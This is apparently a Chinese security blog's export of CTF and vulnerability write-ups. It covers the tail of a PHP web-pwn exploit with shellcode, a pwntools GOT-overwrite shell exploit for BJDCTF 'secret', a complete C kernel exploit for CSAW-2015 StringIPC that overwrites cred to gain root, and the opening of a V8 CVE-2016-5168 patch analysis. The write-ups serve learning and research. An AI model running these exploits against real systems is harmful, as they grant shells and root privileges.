0x10;for ($j=0;$j&lt;8;$j++) &#123;   $oob[$offset+$j] = chr($pop_rdi &amp; 0xFF);   $pop_rdi = $pop_rdi &gt;&gt; 0x8;&#125;$offset += 8;$stack_addr = $offset + ($oob_self_obj_addr + 0x18);$data = $stack_addr ^ ($stack_addr &amp; 0xfff);for ($j=0;$j&lt;8;$j++) &#123;   $oob[$offset+$j] = chr($data &amp; 0xFF);   $data = $data &gt;&gt; 0x8;&#125;$offset += 8;$data = $mprotect_addr;for ($j=0;$j&lt;8;$j++) &#123;   $oob[$offset+$j] = chr($data &amp; 0xFF);   $data = $data &gt;&gt; 0x8;&#125;$offset += 8;$data = $stack_addr+0x18;for ($j=0;$j&lt;8;$j++) &#123;   $oob[$offset+$j] = chr($data &amp; 0xFF);   $data = $data &gt;&gt; 0x8;&#125;$stack_addr += 0x18;$offset += 0x8;$shellcode = &quot;\\x55\\x48\\x89\\xE5\\x48\\x83\\xEC\\x30\\x48\\xB8\\x2F\\x72\\x65\\x61\\x64\\x66\\x6C\\x61\\x48\\x89\\x45\\xF0\\x48\\xC7\\xC0\\x67\\x00\\x00\\x00\\x48\\x89\\x45\\xF8\\x48\\x8D\\x7D\\xF0\\x48\\xC7\\xC6\\x00\\x00\\x00\\x00\\x48\\xC7\\xC2\\x00\\x00\\x00\\x00\\xB8\\x3B\\x00\\x00\\x00\\x0F\\x05&quot;;$len = strlen($shellcode);//写shellcodefor ($j=0;$j&lt;$len;$j++) &#123;   $oob[$offset+$j] = $shellcode[$j];&#125;?&gt;\n\n0x04 感想第一次接触WEB PWN，突然觉得php语言的模块功能好灵活方便，WEB PWN也挺有趣。\n0x05 参考链接[ PHP 内核与扩展开发系列] PHP 生命周期 —— 启动、终止与模式](https://laravelacademy.org/post/7152.html)PHP扩展之PHP的启动和停止php7扩展开发 一 获取参数php-srcPHP7 Memory Exploitation\n","categories":["CTF","安全研究"],"tags":["ROP","UAF","PHP PWN"]},{"title":"BJDCTF 2^nd^ secret","url":"/2020/04/09/BJDCTF_2nd_secret/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n是一个猜数游戏，数值全在代码里，但是有10000个，显然全部抠出来太慢了。\n\n\n我们再看一下其他函数，发现输入name时，存在缓冲区溢出，可以改写0x000000000046D090处的指针，而该处指针指向count变量，每猜一下，就会对count减1。\n\n\n\n\n然后，我们注意到printf的got表的值比system的got表的值大，并且相差0x10.\n\n\n因此，我们可以利用溢出，把指针覆盖为printf的got表，然后猜对15次，最后一次猜错。这会导致printf的got表值减去16，也就变成了system的got表一样的值。从而能够调用system。\n#coding:utf8from pwn import *#sh = process(&#x27;./secret&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,26191)elf = ELF(&#x27;./secret&#x27;)printf_got = elf.got[&#x27;printf&#x27;]answer = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3F7D,0x357A,0x3CF5,0x2F9E,0x41EA,0x48D8,0x2763,0x474C,0x3809,0x2E63]payload = &#x27;/bin/sh\\x00&#x27;.ljust(0x10,&#x27;\\x00&#x27;) + p32(printf_got)sh.sendafter(&quot;What&#x27;s your name?&quot;,payload)for x in answer:   sh.sendlineafter(&#x27;Secret:&#x27;,str(x))#现在printf的got表被修改为了system_plt#getshellsh.sendlineafter(&#x27;Secret:&#x27;,&#x27;1&#x27;)sh.interactive()","categories":["CTF"],"tags":["全局变量溢出","变量覆盖"]},{"title":"CSAW-2015-StringIPC解法一搜索修改cred结构","url":"/2020/03/06/CSAW-2015-StringIPC%E8%A7%A3%E6%B3%95%E4%B8%80%E4%BF%AE%E6%94%B9cred%E7%BB%93%E6%9E%84/","content":"首先，查看一下启动脚本，发现没有开smap、smep、kaslr\nqemu-system-x86_64 \\      -m 512 \\      -kernel ./bzImage \\      -initrd ./rootfs.cpio \\      -append &quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init&quot; \\      -nographic \\      -s \\      -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\ \n\n查看一下内核版本，为4.4.x\n\n\n然后，我们分析一下StringIPC.ko驱动文件，题目有提供给我们源代码，那么我们直接分析源代码\nrealloc_ipc_channel函数里，没有对new_size进行检查**，如果new_size为-1的话，程序将krealloc(0)，与glibc的堆不同的是,如果kmalloc(0)&#x2F;kerallloc(0)，返回的地址就是0x10**\n\n\n而后面又将buf_size设置为new_size，如果new_size是-1，由于是无符号数，并且堆地址为0x10，那么我们就能实现任意地址读写\n写数据的时候，需要注意的是使用了strncpy_from_user函数，因此数据中如果遇到0，就截断了，因此，在写的时候，我们应该逐字节写入\n\n\n能实现任意地址读写，那么最简单的方法就是在内存里搜索cred结构，然后篡改，从而提权。那么，如何可靠的在内存中查找cred结构能？\nLinux的进程有一个这样的结构体(太长部分省略)\nstruct task_struct &#123;     ...     /* Objective and real subjective task credentials (COW): */     const struct cred __rcu      *real_cred;       /* Effective (overridable) subjective task credentials (COW): */     const struct cred __rcu      *cred;       /*     * executable name, excluding path.     *     * - normally initialized setup_new_exec()     * - access it with [gs]et_task_comm()     * - lock it with task_lock()     */     char             comm[TASK_COMM_LEN];     ...  &#125;  \n\n我们看到了，在task_struct结构体里有cred的指针，我们只要得到了cred的指针的值，那么我们就能利用任意地址读写来找到cred，进而修改。那么如何找到cred的指针呢？我们注意到，在cred指针下方，有一个comm字符数组，这个字符串表示线程的名字，其内容可以通过linux的prctl(PR_SET_NAME,target);来设置指定的值那么，我们设置一个复杂的长度不超过16字节的字符串作为标记，然后，在内存里搜索这个标记，如果搜索到了，就可以确定这个位置前面就是cred指针。\n为了提高搜索的效率，我们还要确定一下搜索的范围，linux kernel的内存映射图如下\n0xffffffffffffffff  ---+-----------+-----------------------------------------------+-------------+                         |           |                                               |+++++++++++++|      8M                 |           | unused hole                                   |+++++++++++++|                         |           |                                               |+++++++++++++|  0xffffffffff7ff000  ---|-----------+------------| FIXADDR_TOP |--------------------|+++++++++++++|      1M                 |           |                                               |+++++++++++++|  0xffffffffff600000  ---+-----------+------------| VSYSCALL_ADDR |------------------|+++++++++++++|      548K               |           | vsyscalls                                     |+++++++++++++|  0xffffffffff577000  ---+-----------+------------| FIXADDR_START |------------------|+++++++++++++|      5M                 |           | hole                                          |+++++++++++++|  0xffffffffff000000  ---+-----------+------------| MODULES_END |--------------------|+++++++++++++|                         |           |                                               |+++++++++++++|      1520M              |           | module mapping space (MODULES_LEN)            |+++++++++++++|                         |           |                                               |+++++++++++++|  0xffffffffa0000000  ---+-----------+------------| MODULES_VADDR |------------------|+++++++++++++|                         |           |                                               |+++++++++++++|      512M               |           | kernel text mapping, from phys 0              |+++++++++++++|                         |           |                                               |+++++++++++++|  0xffffffff80000000  ---+-----------+------------| __START_KERNEL_map |-------------|+++++++++++++|      2G                 |           | hole                                          |+++++++++++++|  0xffffffff00000000  ---+-----------+-----------------------------------------------|+++++++++++++|      64G                |           | EFI region mapping space                      |+++++++++++++|  0xffffffef00000000  ---+-----------+-----------------------------------------------|+++++++++++++|      444G               |           | hole                                          |+++++++++++++|  0xffffff8000000000  ---+-----------+-----------------------------------------------|+++++++++++++|      16T                |           | %esp fixup stacks                             |+++++++++++++|  0xffffff0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|      3T                 |           | hole                                          |+++++++++++++|  0xfffffc0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|      16T                |           | kasan shadow memory (16TB)                    |+++++++++++++|  0xffffec0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|      1T                 |           | hole                                          |+++++++++++++|  0xffffeb0000000000  ---+-----------+-----------------------------------------------| kernel space|      1T                 |           | virtual memory map for all of struct pages    |+++++++++++++|  0xffffea0000000000  ---+-----------+------------| VMEMMAP_START |------------------|+++++++++++++|      1T                 |           | hole                                          |+++++++++++++|  0xffffe90000000000  ---+-----------+------------| VMALLOC_END   |------------------|+++++++++++++|      32T                |           | vmalloc/ioremap (1 &lt;&lt; VMALLOC_SIZE_TB)        |+++++++++++++|  0xffffc90000000000  ---+-----------+------------| VMALLOC_START |------------------|+++++++++++++|      1T                 |           | hole                                          |+++++++++++++|  0xffffc80000000000  ---+-----------+-----------------------------------------------|+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|      64T                |           | direct mapping of all phys. memory            |+++++++++++++|                         |           | (1 &lt;&lt; MAX_PHYSMEM_BITS)                       |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|                         |           |                                               |+++++++++++++|  0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | -------------|+++++++++++++|                         |           |                                               |+++++++++++++|      8T                 |           | guard hole, reserved for hypervisor           |+++++++++++++|                         |           |                                               |+++++++++++++|  0xffff800000000000 ----+-----------+-----------------------------------------------+-------------+                         |-----------|                                               |-------------|                         |-----------| hole caused by [48:63] sign extension         |-------------|                         |-----------|                                               |-------------|  0x0000800000000000 ----+-----------+-----------------------------------------------+-------------+      PAGE_SIZE          |           | guard page                                    |xxxxxxxxxxxxx|  0x00007ffffffff000 ----+-----------+--------------| TASK_SIZE_MAX | ---------------|xxxxxxxxxxxxx|                         |           |                                               |  user space |                         |           |                                               |xxxxxxxxxxxxx|                         |           |                                               |xxxxxxxxxxxxx|                         |           |                                               |xxxxxxxxxxxxx|      128T               |           | different per mm                              |xxxxxxxxxxxxx|                         |           |                                               |xxxxxxxxxxxxx|                         |           |                                               |xxxxxxxxxxxxx|                         |           |                                               |xxxxxxxxxxxxx|  0x0000000000000000 ----+-----------+-----------------------------------------------+-------------+  \n\n我们注意到，在**0xffff880000000000——0xffffc80000000000区域，**是堆的分配区域，因此，我们只需要搜索这段内存，即可找到task_struct结构，进而找到cred结构。\n我们的exploit.c程序\n#include &lt;stdio.h&gt;  #include &lt;stdlib.h&gt;  #include &lt;string.h&gt;  #include &lt;unistd.h&gt;  #include &lt;fcntl.h&gt;  #include &lt;sys/ioctl.h&gt;  #include &lt;sys/prctl.h&gt;    #define CSAW_IOCTL_BASE     0x77617363  #define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1  #define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2  #define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3  #define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4  #define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5  #define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6  #define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7  #define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8    struct alloc_channel_args &#123;      size_t buf_size;      int id;  &#125;;    struct shrink_channel_args &#123;      int id;      size_t size;  &#125;;    struct read_channel_args &#123;      int id;      char *buf;      size_t count;  &#125;;    struct write_channel_args &#123;      int id;      char *buf;      size_t count;  &#125;;    struct seek_channel_args &#123;      int id;      loff_t index;      int whence;  &#125;;    void errExit(char *msg) &#123;     puts(msg);     exit(-1);  &#125;  //驱动的文件描述符  int fd;  //初始化驱动  void initFD() &#123;     fd = open(&quot;/dev/csaw&quot;,O_RDWR);     if (fd &lt; 0) &#123;        errExit(&quot;[-] open file error!!&quot;);     &#125;  &#125;    //申请一个channel,返回id  int alloc_channel(size_t size) &#123;     struct alloc_channel_args args;     args.buf_size = size;     args.id = -1;     ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;args);     if (args.id == -1) &#123;        errExit(&quot;[-]alloc_channel error!!&quot;);     &#125;     return args.id;  &#125;    //改变channel的大小  void shrink_channel(int id,size_t size) &#123;     struct shrink_channel_args args;     args.id = id;     args.size = size;     ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;args);  &#125;  //seek  void seek_channel(int id,loff_t offset,int whence) &#123;     struct seek_channel_args args;     args.id = id;     args.index = offset;     args.whence = whence;     ioctl(fd,CSAW_SEEK_CHANNEL,&amp;args);  &#125;  //读取数据  void read_channel(int id,char *buf,size_t count) &#123;     struct read_channel_args args;     args.id = id;     args.buf = buf;     args.count = count;     ioctl(fd,CSAW_READ_CHANNEL,&amp;args);  &#125;  //写数据  void write_channel(int id,char *buf,size_t count) &#123;     struct write_channel_args args;     args.id = id;     args.buf = buf;     args.count = count;     ioctl(fd,CSAW_WRITE_CHANNEL,&amp;args);  &#125;  //任意地址读  void arbitrary_read(int id,char *buf,size_t addr,size_t count) &#123;     seek_channel(id,addr-0x10,SEEK_SET);     read_channel(id,buf,count);  &#125;  //任意地址写  //由于题目中使用了strncpy_from_user,遇到0就会截断，因此，我们逐字节写入  void arbitrary_write(int id,char *buf,size_t addr,size_t count) &#123;     for (int i=0;i&lt;count;i++) &#123;        seek_channel(id,addr+i-0x10,SEEK_SET);        write_channel(id,buf+i,1);     &#125;  &#125;      char root_cred[28] = &#123;0&#125;;  int main() &#123;     //通过prctl给当前进程的task结构设置一个标记，方便我们在内存中搜索时可以作为依据     //char tag[16] = &quot;thisisatag&quot;;     char *buf = (char *)calloc(1,0x1000);     //prctl(PR_SET_NAME,tag);      char target[16];      strcpy(target,&quot;try2findmesauce&quot;);      prctl(PR_SET_NAME,target);     initFD();     //申请一个channel，大小0x100     int id = alloc_channel(0x100);     //改变channel大小，形成漏洞,实现任意地址读写     shrink_channel(id,0x101);     size_t cred_addr = -1;     //task和cred结构的范围在0xffff880000000000~0xffffc80000000000     for (size_t addr=0xffff880000000000;addr &lt; 0xffffc80000000000;addr += 0x1000) &#123;        //每次读取0x1000的字节        arbitrary_read(id,buf,addr,0x1000);          //搜索当前读出的数据里是否有我们的标记        size_t tag_ptr = memmem(buf, 0x1000,target,16);        if (tag_ptr) &#123;           cred_addr = *(size_t *)(tag_ptr - 0x8);           size_t real_cred_addr = *(size_t *)(tag_ptr - 0x10);           if ((cred_addr &amp; 0xff00000000000000) &amp;&amp; cred_addr == real_cred_addr) &#123;              printf(&quot;[+] found cred_ptr at 0x%lx\\n&quot;,addr + tag_ptr - (size_t)buf);              printf(&quot;[+] cred_addr at 0x%lx\\n&quot;,cred_addr);              break;           &#125;        &#125;     &#125;     if (cred_addr == -1) &#123;        errExit(&quot;[-]can&#x27;t find cred!!&quot;);     &#125;     arbitrary_write(id,root_cred,cred_addr,28);     if (getuid() == 0) &#123;        printf(&quot;[+]rooted!!\\n&quot;);        system(&quot;/bin/sh&quot;);     &#125; else &#123;        errExit(&quot;[-]root fail!!\\n&quot;);     &#125;     return 0;  &#125;  ","categories":["CTF"],"tags":["堆溢出","Linux Kernel","Linux内核堆","task_struct"]},{"title":"Chrome Issue 659475(CVE-2016-5168)漏洞分析","url":"/2021/03/17/CVE-2016-5168/","content":"文章首发于安全KER https://www.anquanke.com/post/id/234534\n0x00 前言Issue 659475的漏洞利用过程非常巧妙，结合了String(null)对象完成漏洞利用。本文将介绍这个巧妙的过程。\n0x01 前置知识String对象结构在V8中，String对象其实就是JSValue对象，而决定JSValue的值的关键就是它的value字段。使用如下代码进行调试\nvar str = new String(&quot;aaaaaaaaaaaaaaa&quot;);var str2 = new String(&quot;aaaaaaaaaaaaaaa&quot;);var str3 = new String(&quot;bbbbbbbbbbbbbb&quot;);var str4 = new String(null);%DebugPrint(str);%DebugPrint(str2);%DebugPrint(str3);%DebugPrint(str4);%SystemBreak();\n运行结果如下\nDebugPrint: 0x28c3ab48a0f9: [JSValue] - map = 0x3bc278906981 [FastProperties] - prototype = 0x383e38b978c1 - elements = 0x1c1ca5f02241 &lt;FixedArray[0]&gt; [FAST_STRING_WRAPPER_ELEMENTS] - value = 0x383e38baaff9 &lt;String[15]: aaaaaaaaaaaaaaa&gt; - properties = &#123;   #length: 0x1c1ca5f56379 &lt;AccessorInfo&gt; (accessor constant) &#125;DebugPrint: 0x28c3ab48a119: [JSValue] - map = 0x3bc278906981 [FastProperties] - prototype = 0x383e38b978c1 - elements = 0x1c1ca5f02241 &lt;FixedArray[0]&gt; [FAST_STRING_WRAPPER_ELEMENTS] - value = 0x383e38baaff9 &lt;String[15]: aaaaaaaaaaaaaaa&gt; - properties = &#123;   #length: 0x1c1ca5f56379 &lt;AccessorInfo&gt; (accessor constant) &#125;DebugPrint: 0x28c3ab48a139: [JSValue] - map = 0x3bc278906981 [FastProperties] - prototype = 0x383e38b978c1 - elements = 0x1c1ca5f02241 &lt;FixedArray[0]&gt; [FAST_STRING_WRAPPER_ELEMENTS] - value = 0x383e38bab061 &lt;String[14]: bbbbbbbbbbbbbb&gt; - properties = &#123;   #length: 0x1c1ca5f56379 &lt;AccessorInfo&gt; (accessor constant) &#125;DebugPrint: 0x28c3ab48a159: [JSValue] - map = 0x3bc278906981 [FastProperties] - prototype = 0x383e38b978c1 - elements = 0x1c1ca5f02241 &lt;FixedArray[0]&gt; [FAST_STRING_WRAPPER_ELEMENTS] - value = 0x1c1ca5f02251 &lt;String[4]: null&gt; - properties = &#123;   #length: 0x1c1ca5f56379 &lt;AccessorInfo&gt; (accessor constant) &#125;\n从运行结果我们可以发现，str和str2虽然它们地址不一样，但是它们的字符串值一样，因此它们的value字段都指向了同一个地址0x383e38baaff9查看value指向的位置的结构\npwndbg&gt; x /20gx 0x1b780802aff80x1b780802aff8:\t0x00000d92c0a82361\t0x000000006548be920x1b780802b008:\t0x0000000f00000000\t0x61616161616161610x1b780802b018:\t0xde61616161616161\t0x00000d92c0a82361\nvalue的结构如下\nstruct Value &#123;\tMap *map;\tuint32_t hash;\tuint64_t padding;\tuint32_t length;\tchar content[length];&#125;\n对于String对象，可以使用[]操作符进行字符串中字符的访问，但是不能进行修改。对于String(null)，其value指向的是一个null的对象，其Value结构中，length字段为0x4，content字段为0xdeadbeed6c6c756e。\nproperty 的存储有关property access的优化，已经在前面文章中详细介绍过，主要就是对于对象的慢属性访问会在JIT时被优化为下标的方式进行访问。对于一开始就是字典类型的对象var a = &#123;&#125;，处理double、SMI和Object类型时，都是直接给对应的字段赋值，其中SMI存储使用的是高4字节；使用如下代码测试\nvar a = &#123;&#125;;a.x0 = 1.1;a.x1 = 0x666666;a.x3 = a;%DebugPrint(a);%SystemBreak();\n结果如下\nDebugPrint: 0x3191c908a059: [JS_OBJECT_TYPE] - map = 0x38fd4510c3e9 [FastProperties] - prototype = 0x3672f7504101 - elements = 0x3a4833482241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS] - properties = &#123;   #x0: &lt;unboxed double&gt; 1.1 (data field at offset 0)   #x1: 6710886 (data field at offset 1)   #x3: 0x3191c908a059 &lt;an Object with map 0x38fd4510c3e9&gt; (data field at offset 2) &#125; pwndbg&gt; x /20gx 0x3191c908a0580x3191c908a058:\t0x000038fd4510c3e9\t0x00003a48334822410x3191c908a068:\t0x00003a4833482241\t0x3ff199999999999a0x3191c908a078:\t0x0066666600000000\t0x00003191c908a059\n而对于一开始不是字典类型的对象，如var a = new Date();，处理double类型的字段赋值时，会将double数据先包装为MutableNumber，然后将该对象的指针赋值给相应的字段，测试代码如下\nvar a = new Date();a.x0 = 1.1;a.x1 = 0x666666;a.x3 = a;%DebugPrint(a);%SystemBreak();\n运行如下\nDebugPrint: 0x1d4cc9e8a061: [JSDate] - map = 0x1cbdfe0c3e9 [FastProperties] - prototype = 0x3d14b440c2d9 - elements = 0x20de36302241 &lt;FixedArray[0]&gt; [FAST_HOLEY_SMI_ELEMENTS] - value = 0x1d4cc9e8a0c1 &lt;Number: 1.61562e+12&gt; - time = NaN - properties = &#123;   #x0: 0x1d4cc9e8a131 &lt;MutableNumber: 1.1&gt; (data field at offset 0)   #x1: 6710886 (data field at offset 1)   #x3: 0x1d4cc9e8a061 &lt;a Date with map 0x1cbdfe0c3e9&gt; (data field at offset 2) &#125;0x1d4cc9e8a110:\t0x0000000300000000\t0x00001d4cc9e8a1310x1d4cc9e8a120:\t0x0066666600000000\t0x00001d4cc9e8a0610x1d4cc9e8a130:\t0x000011d70e482eb9\t0x3ff199999999999a\n从这个特性中思考，如果我们有漏洞能够任意控制属性字段的内存值为某一个地址addr+0x1，那么，接下来将一个double数据赋值给这个字段时，就可以往addr+0x8的地方写入一个unboxed double数据。这意味着就实现了任意地址写。\n编译器版本由于本漏洞属于老版本的V8，其V8编译器结构如下有两种编译器，一个是Crankshaft，另一个是TurboFan，两者的不同点在于\n\nCrankshaft仅仅可以优化Javascript一部分语言的短板。例如，它并没有通过结构化的异常处理来设计代码，即代码块不能通过try、catch、finally等关键字划分。\n\nfunction opt() &#123;   var a = [1.1,2.2,3.3];   var b = [2.2,3.3,4.4];   var c = [a,b];   return c;&#125;for (var i=0;i&lt;10000;i++) &#123;   opt();&#125;\n加入-print-opt-code选项，JIT信息如下\n--- Raw source ---() &#123;   var a = [1.1,2.2,3.3];   var b = [2.2,3.3,4.4];   var c = [a,b];   return c;&#125;--- Optimized code ---optimization_id = 0source_position = 12kind = OPTIMIZED_FUNCTIONname = optstack_slots = 5compiler = crankshaft\n可以看到是用crankshaft进行的编译，现在，我们在函数里加入try &#123;&#125; catch () &#123;&#125;语句，然后重新测试，由于循环次数10000触发了crankshaft进行编译，当crankshaft无法处理这种情况，于是无反应，将10000改为100000，即可触发turbofan编译了。\n--- Raw source ---() &#123;   try&#123;   var a = [1.1,2.2,3.3];   var b = [2.2,3.3,4.4];   var c = [a,b];   return c;   &#125; catch (e) &#123;   &#125;&#125;--- Optimized code ---optimization_id = 0source_position = 12kind = OPTIMIZED_FUNCTIONname = optstack_slots = 4compiler = turbofan\n\n0x02 漏洞分析利用patch分析关键的patch点如下\ndiff --git a/src/crankshaft/hydrogen.cc b/src/crankshaft/hydrogen.ccindex 16c3639..79e78a5 100644--- a/src/crankshaft/hydrogen.cc+++ b/src/crankshaft/hydrogen.cc@@ -6518,11 +6518,19 @@           access = access.WithRepresentation(Representation::Smi());           break;         case PropertyCellConstantType::kStableMap: &#123;-          // The map may no longer be stable, deopt if it&#x27;s ever different from-          // what is currently there, which will allow for restablization.-          Handle&lt;Map&gt; map(HeapObject::cast(cell-&gt;value())-&gt;map());+          // First check that the previous value of the &#123;cell&#125; still has the+          // map that we are about to check the new &#123;value&#125; for. If not, then+          // the stable map assumption was invalidated and we cannot continue+          // with the optimized code.+          Handle&lt;HeapObject&gt; cell_value(HeapObject::cast(cell-&gt;value()));+          Handle&lt;Map&gt; cell_value_map(cell_value-&gt;map());+          if (!cell_value_map-&gt;is_stable()) &#123;+            return Bailout(kUnstableConstantTypeHeapObject);+          &#125;+          top_info()-&gt;dependencies()-&gt;AssumeMapStable(cell_value_map);+          // Now check that the new &#123;value&#125; is a HeapObject with the same map.           Add&lt;HCheckHeapObject&gt;(value);-          value = Add&lt;HCheckMaps&gt;(value, map);+          value = Add&lt;HCheckMaps&gt;(value, cell_value_map);           access = access.WithRepresentation(Representation::HeapObject());           break;         &#125;\n从源码路径可以知道，该漏洞与crankshaft编译器有关，patch修复了漏洞，该patch位于HandleGlobalVariableAssignment函数，因此，该函数用于处理全局变量的赋值操作。在V8的优化过程中，有一个特点就是，对于stable map的对象，其checkmap节点会被移除，patch中最关键的一句是top_info()-&gt;dependencies()-&gt;AssumeMapStable(cell_value_map)。其中AssumeMapStable源码如下\nvoid CompilationDependencies::AssumeMapStable(Handle&lt;Map&gt; map) &#123;  DCHECK(map-&gt;is_stable());  // Do nothing if the map cannot transition.  if (map-&gt;CanTransition()) &#123;    Insert(DependentCode::kPrototypeCheckGroup, map);  &#125;&#125;\n由于加入了这个DependentCode::kPrototypeCheckGroup的检查，如果后期map变成unstable了，即使没有checkmap节点的检查，也因为有该检查而不会出错，保证其在结构发生变化时能进行deoptimization bailout。\nPOC编写我们的测试程序如下\nvar a;function Ctor() &#123;   a = new Date();&#125;for (var i=0;i&lt;10000;i++) &#123;   Ctor();&#125;%DebugPrint(a);\n运行结果如下\nDebugPrint: 0xb6f27a26391: [JSDate] - map = 0x17bdc13042a9 [FastProperties] - prototype = 0x2bb939b8c2d9 - elements = 0x147f67e02241 &lt;FixedArray[0]&gt; [FAST_HOLEY_SMI_ELEMENTS] - value = 0xb6f27a263f1 &lt;Number: 1.61562e+12&gt; - time = NaN - properties = &#123; &#125;0x17bdc13042a9: [Map] - type: JS_DATE_TYPE - instance size: 96 - inobject properties: 0 - elements kind: FAST_HOLEY_SMI_ELEMENTS - unused property fields: 0 - enum length: invalid - stable_map - back pointer: 0x147f67e02311 &lt;undefined&gt; - instance descriptors (own) #0: 0x147f67e02231 &lt;FixedArray[0]&gt; - layout descriptor: 0 - prototype: 0x2bb939b8c2d9 &lt;an Object with map 0x17bdc1304301&gt; - constructor: 0x2bb939b8c269 &lt;JS Function Date (SharedFunctionInfo 0x147f67e3ec79)&gt; - code cache: 0x147f67e02241 &lt;FixedArray[0]&gt; - dependent code: 0x2bb939babd79 &lt;FixedArray[3]&gt; - construction counter: 0\n其中可以观察到其MAP结构里有一个stable_map标记，我们接着b src/crankshaft/hydrogen.cc:6515，在patch点上方下断点进行调试。\nIn file: /home/sea/Desktop/v8/src/crankshaft/hydrogen.cc   6519           break;   6520         case PropertyCellConstantType::kStableMap: &#123;   6521           // The map may no longer be stable, deopt if it&#x27;s ever different from   6522           // what is currently there, which will allow for restablization.   6523           Handle&lt;Map&gt; map(HeapObject::cast(cell-&gt;value())-&gt;map()); ► 6524           Add&lt;HCheckHeapObject&gt;(value);   6525           value = Add&lt;HCheckMaps&gt;(value, map);   6526           access = access.WithRepresentation(Representation::HeapObject());   6527           break;   6528         &#125;   6529       &#125;pwndbg&gt; p map-&gt;is_stable()$17 = true\n可以看见其MAP是stable的。在前面的基础上，加上对全局变量的属性进行赋值的操作，并进行优化\nvar a;function Ctor() &#123;   a = new Date();&#125;function opt() &#123;   a.x = 1;&#125;for (var i=0;i&lt;10000;i++) &#123;   Ctor();&#125;for (var i=0;i&lt;10000;i++) &#123;   opt();&#125;\n查看生成的JIT代码，加了patch和没加patch，使用--print-opt-code打印的代码竟然在实质上没有任何的差别。\n0x27792c064e0     0  55             push rbp0x27792c064e1     1  4889e5         REX.W movq rbp,rsp0x27792c064e4     4  56             push rsi0x27792c064e5     5  57             push rdi0x27792c064e6     6  4883ec08       REX.W subq rsp,0x80x27792c064ea    10  488b45f8       REX.W movq rax,[rbp-0x8]0x27792c064ee    14  488945e8       REX.W movq [rbp-0x18],rax0x27792c064f2    18  488bf0         REX.W movq rsi,rax0x27792c064f5    21  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]0x27792c064fc    28  7305           jnc 35  (0x27792c06503)0x27792c064fe    30  e8ddc3f5ff     call StackCheck  (0x27792b628e0)    ;; code: BUILTIN0x27792c06503    35  48b841b7ba24643c0000 REX.W movq rax,0x3c6424bab741    ;; object: 0x3c6424bab741 PropertyCell for 0x2d07f24a6399 &lt;a Date with map 0x14b2a498c391&gt;0x27792c0650d    45  488b400f       REX.W movq rax,[rax+0xf]0x27792c06511    49  488b4007       REX.W movq rax,[rax+0x7]0x27792c06515    53  c7401301000000 movl [rax+0x13],0x10x27792c0651c    60  48b8112358a8ae240000 REX.W movq rax,0x24aea8582311    ;; object: 0x24aea8582311 &lt;undefined&gt;0x27792c06526    70  488be5         REX.W movq rsp,rbp0x27792c06529    73  5d             pop rbp0x27792c0652a    74  c20800         ret 0x80x27792c0652d    77  0f1f00         nop\n赋值操作显然没有过多的检查,这是因为该对象的MAP被标识为stable map，如果我们将a = new Date()改成a = &#123;&#125;，其代码如下\n0xbbb2be06700     0  55             push rbp0xbbb2be06701     1  4889e5         REX.W movq rbp,rsp0xbbb2be06704     4  56             push rsi0xbbb2be06705     5  57             push rdi0xbbb2be06706     6  4883ec08       REX.W subq rsp,0x80xbbb2be0670a    10  488b45f8       REX.W movq rax,[rbp-0x8]0xbbb2be0670e    14  488945e8       REX.W movq [rbp-0x18],rax0xbbb2be06712    18  488bf0         REX.W movq rsi,rax0xbbb2be06715    21  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]0xbbb2be0671c    28  7305           jnc 35  (0xbbb2be06723)0xbbb2be0671e    30  e8bdc1f5ff     call StackCheck  (0xbbb2bd628e0)    ;; code: BUILTIN0xbbb2be06723    35  48b841b7720d5a180000 REX.W movq rax,0x185a0d72b741    ;; object: 0x185a0d72b741 PropertyCell for 0x325b7f0af1b1 &lt;an Object with map 0x560aef0c391&gt;0xbbb2be0672d    45  488b400f       REX.W movq rax,[rax+0xf]0xbbb2be06731    49  a801           test al,0x10xbbb2be06733    51  0f842c000000   jz 101  (0xbbb2be06765)0xbbb2be06739    57  49ba91c3f0ae60050000 REX.W movq r10,0x560aef0c391    ;; object: 0x560aef0c391 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;0xbbb2be06743    67  4c3950ff       REX.W cmpq [rax-0x1],r100xbbb2be06747    71  0f851d000000   jnz 106  (0xbbb2be0676a)0xbbb2be0674d    77  c7401b01000000 movl [rax+0x1b],0x10xbbb2be06754    84  48b8112348ddd5280000 REX.W movq rax,0x28d5dd482311    ;; object: 0x28d5dd482311 &lt;undefined&gt;0xbbb2be0675e    94  488be5         REX.W movq rsp,rbp0xbbb2be06761    97  5d             pop rbp0xbbb2be06762    98  c20800         ret 0x80xbbb2be06765   101  e8a0d8d7ff     call 0xbbb2bb8400a       ;; deoptimization bailout 10xbbb2be0676a   106  e8a5d8d7ff     call 0xbbb2bb84014       ;; deoptimization bailout 20xbbb2be0676f   111  90             